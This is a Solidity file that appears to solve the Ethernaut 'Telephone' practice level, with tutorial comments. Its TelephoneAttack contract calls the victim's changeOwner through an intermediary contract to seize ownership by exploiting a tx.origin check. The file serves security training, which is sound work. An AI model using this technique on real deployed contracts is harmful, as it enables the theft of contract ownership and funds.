// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

You can either use an interface or import the contract.

I usually put the interfaces at the end of the code. It is not a rule of thumb though.
You will need to create the interface to the contract to interact with it from
this one.

For this solution I will use the interface way.*/

contract TelephoneAttack{

  // We create the contract object that will have the methods defined in the interface
  Telephone victim = Telephone(0x7c57AEbBB086B27Bf47fDDEbD809341702eFA3D3); //TODO: Replace by your deployed target contract address

  /* We could make the constructor in a way so you can change the contract address and factor
  as needed when deploying. For the sake of simplicity we won't do it here though.*/
  constructor(){
  }

  function proxyAttack() public {
    
    // We will just call the function from this contract

    victim.changeOwner(msg.sender);

  }
}

/* The easiest way to build an interface for another contract is to just copy the functions
"header" here, changing it to "external": */

interface Telephone {
  function changeOwner(address _owner) external;
}